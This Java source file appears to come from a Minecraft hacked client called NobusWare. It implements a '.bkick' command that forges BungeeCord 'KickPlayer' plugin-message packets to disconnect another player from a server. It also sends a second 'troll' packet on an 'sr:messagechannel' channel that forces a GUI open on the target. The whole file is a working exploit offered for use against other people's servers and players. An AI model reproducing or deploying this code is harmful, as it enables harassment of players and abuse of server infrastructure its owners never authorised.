package it.nobusware.client.commands;

import io.netty.buffer.Unpooled;
import it.nobusware.client.manager.Command;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;

public class BKick extends  Command{

	@Override
	public String getAlias() {
		return "bkick";
	}

	@Override
	public String getDescription() {
		return "Bungee  Kicked Online Player";
	}

	@Override
	public String getSyntax() {
		return ".bkick <Player> <Reason>";
	}

	@Override
	public void onCommand(String paramString, String[] paramArrayOfString) throws Exception {
	    if (paramString.isEmpty()) {
	    	ChatUtils.print("§cFormato errato, formato: "+ getSyntax());
	    } 
		String player = paramArrayOfString[0];
		onKick(player, "NobusWare.tk");
		startedtroller(player);
	}
	
	private void startedtroller(String trollato) {
		System.out.println("Started..");
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
			out.writeUTF("OPENGUI");
			out.writeUTF(trollato);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			Minecraft.getMinecraft().thePlayer.sendQueue.noEventPacket(new C17PacketCustomPayload("sr:messagechannel", buf));
			System.out.println("Sended Troll Packet");
		} catch (IOException e) {
			System.out.println("Errore Nel Troll");
		}
	}
	
	private void onKick(String p, String reason) {
		System.out.println("Started..");
		try {
			final ByteArrayOutputStream b = new ByteArrayOutputStream();
			final DataOutputStream out = new DataOutputStream(b);
			out.writeUTF("KickPlayer");
			out.writeUTF(p);
			out.writeUTF(reason);
			PacketBuffer buf = (new PacketBuffer(Unpooled.buffer()));
			buf.writeBytes(b.toByteArray());
			Minecraft.getMinecraft().thePlayer.sendQueue.noEventPacket(new C17PacketCustomPayload("BungeeCord", buf));
			ChatUtils.print("§cKicked §a" + p +  " §cFor §a" + reason);
		} catch (IOException e) {
			System.out.println("Errore Nel Kick");
		}
	}
}